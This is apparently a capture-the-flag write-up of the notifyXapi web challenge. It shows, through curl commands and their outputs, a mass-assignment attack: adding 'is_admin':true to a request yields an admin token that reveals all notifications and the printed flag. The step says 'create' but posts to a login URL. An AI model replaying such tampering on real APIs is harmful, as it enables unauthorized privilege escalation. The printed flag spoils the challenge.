# notifyXapi

### Challenge

- **Category**: Web

Reynholm Industries needed a system to issue notifications/messages for their employees. Maurice Moss, coding genius of The IT crowd, was assigned with the task to create one. The basic idea was that upper-level employees can create and view all the notifications. The lower-level employees shouldn't be able to read the confidential upper-level only notifications. Is Maurice really a coding genius ?

Challenge link: <https://notifyxapi.rootersctf.in/>

### Solution

When I entered in the web application i saw three api methods:

1. Register

   ```bash
   $ curl -X POST "https://notifyxapi.rootersctf.in/api/v1/register/" -H "Content-Type: application/json" \
   -d '{"email": "test@test.com", "password": "password"}'
   ```

   

2. Login

   ```bash
   $ curl -X POST "https://notifyxapi.rootersctf.in/api/v1/login/" -H "Content-Type: application/json" \
   -d '{"email": "test@test.com", "password": "password"}'
   ```

   

3. Creating Notifications

   ```bash
   $ export ACCESS="j.w.t"
   $ curl -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/api/v1/notifications/"
   ```

   

When I registered a user I realized that in the response of the request there was a parameter called "**is_admin**" with value **false**.

```bash
$ curl -X POST "https://notifyxapi.rootersctf.in/api/v1/register/" -H "Content-Type: application/json" -d '{"email": "cynops@test.com", "password": "password"}'

{"created_user":{"id":331,"user":{"email":"cynops@test.com","is_admin":false,"id":331},"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzA4MzA1MTksIm5iZiI6MTU3MDgzMDUxOSwianRpIjoiMmZhYjViZDUtNDU2MC00NzQ2LWFiMTItN2FhM2I4NTk3ZmJjIiwiZXhwIjoxNjAyMzY2NTE5LCJpZGVudGl0eSI6MzMxLCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.pOtqBY4g-aaQh4VNbUH5T_hakpXCuJHefDI4jYKQsNY"}}

```

So i decided to create a new user and add in the request the parameter "**is_admin**" with value **true**.

The new user has administrator privileges so we can see the notifications of all users and therefore the flag.

```bash
$ curl -X POST "https://notifyxapi.rootersctf.in/api/v1/login/" -H "Content-Type: application/json" -d '{"email": "cynops_admin@test.com", "password": "password", "is_admin":true}'

{"created_user":{"id":363,"user":{"email":"cynops_admin@test.com","is_admin":true,"id":363},"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzA4NzA5MDYsIm5iZiI6MTU3MDg3MDkwNiwianRpIjoiMGExOTA3MTktMTU2Yi00NzA2LWIwODEtMmE2Y2Q1YTFlY2ZmIiwiZXhwIjoxNjAyNDA2OTA2LCJpZGVudGl0eSI6MzYzLCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.zl8IJgILpDn2Z-kBUXsr2hk6qxoCpk-xbpqYNyz7JKs"}}

```

To retrieve the flag you only need to request the notifications with the new admin user token.

```bash
$ export ACCESS=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzA4NzA5MDYsIm5iZiI6MTU3MDg3MDkwNiwianRpIjoiMGExOTA3MTktMTU2Yi00NzA2LWIwODEtMmE2Y2Q1YTFlY2ZmIiwiZXhwIjoxNjAyNDA2OTA2LCJpZGVudGl0eSI6MzYzLCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.zl8IJgILpDn2Z-kBUXsr2hk6qxoCpk-xbpqYNyz7JKs

$ curl -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/api/v1/notifications/"

[{"body":"rooters{a_big_hard_business_in_a_big_hard_building}ctf","issuer":{"email":"admin@test.com","id":1},"id":1,"title":"flag"},{"body":"hey, rosssssss","issuer":{"email":"test@test.com","id":2},"id":2,"title":"The IT Crowd"},{"body":"Jen Barber? Is that the internet?","issuer":{"email":"test@test.com","id":2},"id":3,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":4,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":5,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":6,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":7,"title":"'"}]
```

> Flag: rooters{a_big_hard_business_in_a_big_hard_building}ctf
